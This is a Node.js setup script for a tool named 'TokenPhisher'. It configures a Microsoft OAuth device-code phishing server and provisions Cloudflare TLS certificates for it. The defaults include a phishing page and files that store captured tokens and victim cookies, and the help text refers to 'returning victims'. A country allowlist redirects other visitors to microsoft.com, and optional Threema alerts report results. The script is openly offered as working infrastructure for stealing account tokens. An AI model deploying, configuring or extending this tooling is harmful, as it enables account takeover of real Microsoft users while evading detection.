#!/usr/bin/env node

import fs from 'fs';
import path from 'path';
import os from 'os';
import { execFileSync } from 'child_process';
import { fileURLToPath } from 'url';
import { parseArgs } from 'util';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = __dirname;
const SERVER_JS = path.join(ROOT, 'server.js');
const CONFIG_JSON = path.join(ROOT, 'config.json');
const CERTS_DIR = path.join(ROOT, 'certs');

const CLOUDFLARE_ORIGIN_CA =
  'https://developers.cloudflare.com/ssl/static/origin_ca_rsa_root.pem';

const DEFAULT_CONFIG = {
  httpPort: 80,
  httpsPort: 443,
  testMode: false,
  debug: false,
  clientId: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
  tokenUrl: 'https://login.microsoftonline.com/Common/oauth2/v2.0/token',
  deviceCodeUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
  scopes: 'offline_access openid',
  phishingHTML: 'index.html',
  redirectUrl: 'https://www.microsoft.com',
  alreadyLoggedInURL: 'https://onedriveURLwithContentOrSomethingElse',
  cookieExpirationInDays: 90,
  userCodesFile: 'successful_user_code_cookies.txt',
  logFile: 'logfile.txt',
  tokenFile: 'tokens.txt',
  threemaOn: false,
  threemaTo: ['YourID1', 'YourID2'],
  threemaFrom: 'YourName',
  threemaURL: 'https://msgapi.threema.ch/send_simple',
  threemaSecret: 'PutYourSecretHere',
  keyFilePath: './certs/privkey.pem',
  certFilePath: './certs/cert.pem',
  caFilePath: './certs/origin-ca.pem',
  userAgent:
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
  geoipallowlist: ['CH'],
};

function printHelp() {
  console.log(`TokenPhisher setup

Usage:
  node setup.mjs [options]

Required for production TLS (Cloudflare):
  --domain <hostname>           Hostname served by this app (e.g. share.example.com)
  --cf-token <token>            Cloudflare API token (or CLOUDFLARE_API_TOKEN env var)
                                Needs Account: Cloudflare Origin CA:Edit and Zone:Read

Common options:
  --redirect-url <url>          Redirect for / and blocked geo IPs
  --already-logged-in-url <url> Redirect for returning victims
  --geoip <codes>               Comma-separated ISO country codes (default: CH)
  --client-id <id>              OAuth client ID
  --scopes <scopes>             OAuth scopes (space-separated)
  --debug                       Enable debug logging
  --test-mode                   HTTP only, no TLS (local testing)
  --config-only                 Update config without provisioning TLS
  --from-config <file>          Load values from an existing JSON config file
  --help                        Show this help

Examples:
  CLOUDFLARE_API_TOKEN=xxx node setup.mjs \\
    --domain share.example.com \\
    --redirect-url https://www.microsoft.com \\
    --already-logged-in-url https://onedrive.live.com/...

  node setup.mjs --test-mode --redirect-url https://http.cat

Cloudflare setup notes:
  - Domain must already use Cloudflare DNS (orange-cloud proxy recommended).
  - openssl must be installed (apt install openssl) — the API requires a CSR.
  - Origin certificates are valid for up to 15 years; certs are saved to ./certs/
  - config.json is written and server.js is updated automatically.
`);
}

function parseGeoip(value) {
  return value
    .split(',')
    .map((code) => code.trim().toUpperCase())
    .filter(Boolean);
}

async function cloudflareRequest(token, method, endpoint, body) {
  const response = await fetch(`https://api.cloudflare.com/client/v4${endpoint}`, {
    method,
    headers: {
      Authorization: `Bearer ${token}`,
      'Content-Type': 'application/json',
    },
    body: body ? JSON.stringify(body) : undefined,
  });

  const data = await response.json();
  if (!response.ok || !data.success) {
    const errors = data.errors?.map((e) => e.message).join('; ') || response.statusText;
    throw new Error(`Cloudflare API error: ${errors}`);
  }
  return data.result;
}

function zoneNameFromHostname(hostname) {
  const parts = hostname.split('.').filter(Boolean);
  if (parts.length <= 2) {
    return hostname;
  }
  return parts.slice(-2).join('.');
}

async function getZoneId(token, hostname) {
  const zoneName = zoneNameFromHostname(hostname);
  const zones = await cloudflareRequest(token, 'GET', `/zones?name=${encodeURIComponent(zoneName)}`);
  if (!zones?.length) {
    throw new Error(
      `No Cloudflare zone found for "${zoneName}". Add the domain to Cloudflare first.`
    );
  }
  return { zoneId: zones[0].id, zoneName: zones[0].name };
}

function generateKeyAndCsr(hostnames) {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tokenphisher-'));
  const keyPath = path.join(tmpDir, 'key.pem');
  const csrPath = path.join(tmpDir, 'csr.pem');
  const configPath = path.join(tmpDir, 'openssl.cnf');
  const cn = hostnames[0];

  const altNames = hostnames.map((h, i) => `DNS.${i + 1} = ${h}`).join('\n');
  fs.writeFileSync(
    configPath,
    `[req]
distinguished_name = req_distinguished_name
req_extensions = v3_req
prompt = no

[req_distinguished_name]
CN = ${cn}

[v3_req]
subjectAltName = @alt_names

[alt_names]
${altNames}
`
  );

  try {
    execFileSync('openssl', ['genrsa', '-out', keyPath, '2048'], { stdio: 'pipe' });
    execFileSync(
      'openssl',
      ['req', '-new', '-key', keyPath, '-out', csrPath, '-config', configPath],
      { stdio: 'pipe' }
    );
  } catch {
    throw new Error(
      'openssl is required to generate a CSR for Cloudflare origin certificates. Install with: apt install openssl'
    );
  }

  const privateKey = fs.readFileSync(keyPath, 'utf8');
  const csr = fs.readFileSync(csrPath, 'utf8');
  fs.rmSync(tmpDir, { recursive: true, force: true });
  return { privateKey, csr };
}

async function provisionCloudflareOriginCert(token, hostname) {
  console.log(`Provisioning Cloudflare origin certificate for ${hostname} ...`);

  const { zoneName } = await getZoneId(token, hostname);

  const hostnames =
    hostname === zoneName
      ? [zoneName, `*.${zoneName}`]
      : [hostname, `*.${zoneName}`];

  console.log('Generating private key and CSR locally ...');
  const { privateKey, csr } = generateKeyAndCsr(hostnames);

  const cert = await cloudflareRequest(token, 'POST', '/certificates', {
    hostnames,
    requested_validity: 5475,
    request_type: 'origin-rsa',
    csr,
  });

  fs.mkdirSync(CERTS_DIR, { recursive: true });

  const keyPath = path.join(CERTS_DIR, 'privkey.pem');
  const certPath = path.join(CERTS_DIR, 'cert.pem');
  const caPath = path.join(CERTS_DIR, 'origin-ca.pem');

  fs.writeFileSync(keyPath, privateKey, { mode: 0o600 });
  fs.writeFileSync(certPath, cert.certificate, { mode: 0o644 });

  const caResponse = await fetch(CLOUDFLARE_ORIGIN_CA);
  if (!caResponse.ok) {
    throw new Error(`Failed to download Cloudflare Origin CA: ${caResponse.statusText}`);
  }
  fs.writeFileSync(caPath, await caResponse.text(), { mode: 0o644 });

  console.log(`Certificates saved to ${CERTS_DIR}/`);

  return {
    keyFilePath: './certs/privkey.pem',
    certFilePath: './certs/cert.pem',
    caFilePath: './certs/origin-ca.pem',
  };
}

function formatConfigValue(key, value) {
  const serialized = JSON.stringify(value);
  if (key === 'clientId') {
    return `${serialized}, // MS public client ID`;
  }
  return `${serialized},`;
}

function updateServerJs(config) {
  if (!fs.existsSync(SERVER_JS)) {
    throw new Error(`server.js not found at ${SERVER_JS}`);
  }

  let content = fs.readFileSync(SERVER_JS, 'utf8');
  const lines = Object.entries(config).map(
    ([key, value]) => `    ${key}: ${formatConfigValue(key, value)}`
  );
  const newBlock = `const defaultConfig = {\n${lines.join('\n')}\n};`;

  const regex = /const defaultConfig = \{[\s\S]*?\n\};/;
  if (!regex.test(content)) {
    throw new Error('Could not find defaultConfig block in server.js');
  }

  content = content.replace(regex, newBlock);
  fs.writeFileSync(SERVER_JS, content);
  console.log('Updated server.js defaultConfig');
}

function writeConfigJson(config) {
  fs.writeFileSync(CONFIG_JSON, JSON.stringify(config, null, 2) + '\n');
  console.log(`Wrote ${CONFIG_JSON}`);
}

async function main() {
  const { values } = parseArgs({
    options: {
      domain: { type: 'string' },
      'cf-token': { type: 'string' },
      'redirect-url': { type: 'string' },
      'already-logged-in-url': { type: 'string' },
      geoip: { type: 'string' },
      'client-id': { type: 'string' },
      scopes: { type: 'string' },
      debug: { type: 'boolean', default: false },
      'test-mode': { type: 'boolean', default: false },
      'config-only': { type: 'boolean', default: false },
      'from-config': { type: 'string' },
      help: { type: 'boolean', short: 'h', default: false },
    },
    allowPositionals: false,
  });

  if (values.help) {
    printHelp();
    return;
  }

  const config = structuredClone(DEFAULT_CONFIG);

  if (values['from-config']) {
    const imported = JSON.parse(fs.readFileSync(path.resolve(values['from-config']), 'utf8'));
    Object.assign(config, imported);
  }

  if (values['redirect-url']) config.redirectUrl = values['redirect-url'];
  if (values['already-logged-in-url']) config.alreadyLoggedInURL = values['already-logged-in-url'];
  if (values.geoip) config.geoipallowlist = parseGeoip(values.geoip);
  if (values['client-id']) config.clientId = values['client-id'];
  if (values.scopes) config.scopes = values.scopes;
  if (values.debug) config.debug = true;
  if (values['test-mode']) config.testMode = true;

  const cfToken = values['cf-token'] || process.env.CLOUDFLARE_API_TOKEN;
  const domain = values.domain;

  if (!values['test-mode'] && !values['config-only']) {
    if (!cfToken) {
      console.error('Error: --cf-token or CLOUDFLARE_API_TOKEN is required for TLS setup.');
      console.error('Use --test-mode for local HTTP-only testing, or --config-only to skip TLS.');
      process.exit(1);
    }
    if (!domain) {
      console.error('Error: --domain is required for TLS setup.');
      process.exit(1);
    }

    const certPaths = await provisionCloudflareOriginCert(cfToken, domain);
    Object.assign(config, certPaths);
    config.testMode = false;
  } else if (values['test-mode']) {
    config.testMode = true;
  }

  writeConfigJson(config);
  updateServerJs(config);

  console.log('\nSetup complete. Start the server with: npm start');
  if (config.testMode) {
    console.log(`Listening on HTTP port ${config.httpPort}`);
  } else {
    console.log(`Listening on HTTPS port ${config.httpsPort}`);
    console.log('Ensure Cloudflare SSL/TLS mode is Full (strict) for origin certificates.');
  }
}

main().catch((error) => {
  console.error(error.message || error);
  process.exit(1);
});
